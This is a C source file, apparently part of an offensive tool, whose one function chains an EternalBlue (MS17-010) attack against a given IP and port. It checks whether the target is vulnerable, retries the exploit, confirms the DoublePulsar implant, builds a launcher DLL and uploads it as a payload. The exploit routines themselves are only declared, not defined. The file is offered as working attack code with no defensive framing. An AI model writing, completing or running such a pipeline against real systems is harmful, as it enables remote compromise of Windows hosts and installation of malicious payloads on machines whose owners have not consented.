#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"
#include <stdio.h>

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *binary_path, const char *dll_out_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int attempt;
    int result;

    (void)payload_path;

    printf("Checking MS17 vulnerability on %s:%d\n", ip, port);
    if (ms17_vuln_status(ip, port) <= 0) {
        printf("Target is not vulnerable\n");
        return -1;
    }

    printf("Attempting EternalBlue on %s:%d\n", ip, port);
    for (attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        if (EternalBlue(ip, port) == 0) {
            break;
        }
        printf("EternalBlue attempt %d failed\n", attempt + 1);
    }
    if (attempt == MAX_RETRIES) {
        printf("EternalBlue failed after %d attempts\n", MAX_RETRIES);
        return -2;
    }

    printf("Checking DoublePulsar on %s:%d\n", ip, port);
    if (doublepulsar_check(ip, port) <= 0) {
        printf("DoublePulsar is not active\n");
        return -3;
    }

    printf("Building launcher DLL\n");
    if (build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH) != 0) {
        printf("Failed to build launcher DLL\n");
        return -4;
    }

    printf("Uploading payload to %s:%d\n", ip, port);
    result = upload_payload(ip, port, PAYLOAD_DLL_PATH, 1);
    if (result != 0) {
        printf("Failed to upload payload\n");
        return -5;
    }

    printf("EternalBlue pipeline completed successfully\n");
    return 0;
}